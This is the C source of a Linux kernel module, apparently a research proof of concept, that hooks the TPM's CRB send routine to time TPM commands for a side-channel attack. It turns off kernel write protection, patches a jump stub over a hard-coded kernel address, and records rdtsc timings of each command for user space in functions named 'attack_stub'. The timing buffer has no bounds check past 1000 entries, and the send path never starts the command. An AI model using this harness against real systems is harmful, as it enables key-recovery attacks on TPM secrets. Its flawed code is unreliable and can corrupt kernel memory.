#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/acpi.h>
#include <linux/highmem.h>
#include <linux/rculist.h>
#include <linux/pm_runtime.h>
#include <linux/io.h>
#include <linux/fs.h>
#include <linux/tpm.h>
#include "tpmttl.h"

unsigned long long pcrb_send = 0xffffffff81b2fb00;

unsigned char nop_stub[] = {0x90, 0x90, 0x90, 0x90, 0x90};
unsigned char jmp_stub[] = {0xe9, 0xf1, 0xf2, 0xf3, 0xf4};

enum crb_start {
	CRB_START_INVOKE	= BIT(0),
};

struct crb_regs_head {
	u32 loc_state;
	u32 reserved1;
	u32 loc_ctrl;
	u32 loc_sts;
	u8 reserved2[32];
	u64 intf_id;
	u64 ctrl_ext;
} __packed;

struct crb_regs_tail {
	u32 ctrl_req;
	u32 ctrl_sts;
	u32 ctrl_cancel;
	u32 ctrl_start;
	u32 ctrl_int_enable;
	u32 ctrl_int_sts;
	u32 ctrl_cmd_size;
	u32 ctrl_cmd_pa_low;
	u32 ctrl_cmd_pa_high;
	u32 ctrl_rsp_size;
	u64 ctrl_rsp_pa;
} __packed;

struct crb_priv {
	u32 sm;
	const char *hid;
	struct crb_regs_head __iomem *regs_h;
	struct crb_regs_tail __iomem *regs_t;
	u8 __iomem *cmd;
	u8 __iomem *rsp;
	u32 cmd_size;
	u32 smc_func_id;
	u32 __iomem *pluton_start_addr;
	u32 __iomem *pluton_reply_addr;
};

#define	TPM_STS(l)			(0x0018 | ((l) << 12))


static noinline int internal_crb_send_handler(struct tpm_chip *chip, u8 *buf, size_t len);
static int crb_send_handler(struct tpm_chip *chip, u8 *buf, size_t len);

unsigned long long tscrequest[1000] = {0};
unsigned long long requestcnt = 0;


static void enable_attack_stub()
{
  requestcnt = 0;
  unsigned int target_addr;  
  write_cr0(read_cr0() & (~X86_CR0_WP));

  target_addr = crb_send_handler - pcrb_send - 5;  
  jmp_stub[1] = ((char*)&target_addr)[0];
  jmp_stub[2] = ((char*)&target_addr)[1];
  jmp_stub[3] = ((char*)&target_addr)[2];
  jmp_stub[4] = ((char*)&target_addr)[3];
  memcpy((void*)pcrb_send, jmp_stub, sizeof(jmp_stub));

  write_cr0(read_cr0() | X86_CR0_WP); 
 
  printk("TPMTTL: ENABLED\n");
}

static void disable_attack_stub()
{  
  write_cr0(read_cr0() & (~X86_CR0_WP));

  memcpy((void*)pcrb_send, nop_stub, sizeof(nop_stub));  

  write_cr0(read_cr0() | X86_CR0_WP); 

  printk("TPMTTL: DISABLED\n");
}

static long ioctl_uninstall_timer(struct file *filep, unsigned int cmd, unsigned long arg)
{
  disable_attack_stub();
  return 0;
}

static long ioctl_install_timer(struct file *filep, unsigned int cmd, unsigned long arg)
{
  enable_attack_stub();
  return 0;
}

static long ioctl_read(struct file *filep, unsigned int cmd, unsigned long arg)
{
  struct tpmttl_generic_param *param = (struct tpmttl_generic_param *)arg;
  memcpy(param->ttls, tscrequest, 1000 * sizeof(unsigned long long));
  param->cnt = requestcnt;

  printk(KERN_ALERT "TPMTTL: requestcnt %llu\n", requestcnt);
  requestcnt = 0;

  return 0;
}

typedef long (*tpmttl_ioctl_t)(struct file *filep, unsigned int cmd, unsigned long arg);
long tpmttl_ioctl(struct file *filep, unsigned int cmd, unsigned long arg)
{
  struct tpmttl_generic_param data;
  long ret;
  
  tpmttl_ioctl_t handler = NULL;

  switch (cmd) {    
    case TPMTTL_IOCTL_UNINSTALL_TIMER:
      handler = ioctl_uninstall_timer;
      break;	
    case TPMTTL_IOCTL_INSTALL_TIMER:
      handler = ioctl_install_timer;
      break;	
    case TPMTTL_IOCTL_READ:
      handler = ioctl_read;
      break;  
    default:
      return -EINVAL;
  }
  
  if (copy_from_user(&data, (void __user *) arg, _IOC_SIZE(cmd)))
    return -EFAULT;

  ret = handler(filep, cmd, (unsigned long) ((void *) &data));

  if (!ret && (cmd & IOC_OUT)) {
    if (copy_to_user((void __user *) arg, &data, _IOC_SIZE(cmd)))
      return -EFAULT;
  }
  return ret;
}


static noinline int internal_crb_send_handler(struct tpm_chip *chip, u8 *buf, size_t len)
{
  unsigned long t;
  int rc = 0;
  struct crb_priv *priv = dev_get_drvdata(&chip->dev);

  iowrite32(0, &priv->regs_t->ctrl_cancel);

  if (len > priv->cmd_size) {
		dev_err(&chip->dev, "invalid command count value %zd %d\n",
			len, priv->cmd_size);
		return -E2BIG;
	}

  memcpy_toio(priv->cmd, buf, len);

  wmb();
  t = rdtsc();
  rmb();

  while((ioread32(&priv->regs_t->ctrl_start) & CRB_START_INVOKE) ==
	    CRB_START_INVOKE);
  rmb();

  tscrequest[requestcnt++] = rdtsc() - t;
  
  return rc;
}


static int crb_send_handler(struct tpm_chip *chip, u8 *buf, size_t len)
{
  return internal_crb_send_handler(chip, buf, len);
}


static const struct file_operations tpmttl_fops = {
  .owner = THIS_MODULE,
  .unlocked_ioctl = tpmttl_ioctl,
};

static struct miscdevice tpmttl_miscdev = {
  .minor = MISC_DYNAMIC_MINOR,
  .name = "tpmttl",
  .fops = &tpmttl_fops,
};


static int tpmttl_init(void)
{
  int ret;
  printk(KERN_ALERT "TPMTTL: HELLO\n");

  ret = misc_register(&tpmttl_miscdev);
  if (ret) {
    printk(KERN_ERR "cannot register miscdev(err=%d)\n", ret);
    return ret;
  }

  return 0;
}


static void tpmttl_exit(void)
{ 
  disable_attack_stub();
  misc_deregister(&tpmttl_miscdev);  

  printk(KERN_ALERT "TPMTTL: BYE\n");
}


module_init(tpmttl_init);
module_exit(tpmttl_exit);
MODULE_LICENSE("GPL");
